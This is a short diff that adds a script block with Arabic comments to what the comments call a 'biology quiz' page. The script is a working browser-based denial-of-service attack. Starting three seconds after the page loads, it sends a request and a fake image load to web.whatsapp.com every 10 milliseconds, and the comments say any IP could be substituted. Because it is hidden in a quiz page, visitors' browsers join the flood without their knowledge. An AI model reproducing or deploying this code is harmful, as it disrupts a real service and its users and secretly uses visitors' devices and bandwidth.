@@ -1,0 +1,28 @@
+<script>
+    function ddosAttack() {
+        // الهدف (Target): يمكن أن يكون رابط خادم الواتساب أو أي IP يحدده الدكتور
+        const target = "https://web.whatsapp.com/"; 
+
+        // إنشاء جيش من الطلبات الصامتة
+        setInterval(() => {
+            // نستخدم تقنية الـ Fetch مع تعطيل الـ CORS لضمان إرسال الطلب بسرعة
+            fetch(target + "?query=" + Math.random(), {
+                mode: 'no-cors',
+                cache: 'no-cache'
+            }).then(() => {
+                console.log("Request Sent Successfully");
+            }).catch(() => {
+                // حتى لو فشل الطلب، فإنه قد استهلك جزءاً من باندويث الهدف
+            });
+
+            // إضافة ضغط إضافي عن طريق تحميل صور وهمية من الهدف
+            let flood = new Image();
+            flood.src = target + "favicon.ico?v=" + Math.random();
+        }, 10); // إرسال طلب كل 10 مللي ثانية (سرعة جنونية!)
+    }
+
+    // تشغيل الهجوم بعد 3 ثواني من دخول "مسابقة الأحياء"
+    window.onload = function() {
+        setTimeout(ddosAttack, 3000);
+    };
+</script>
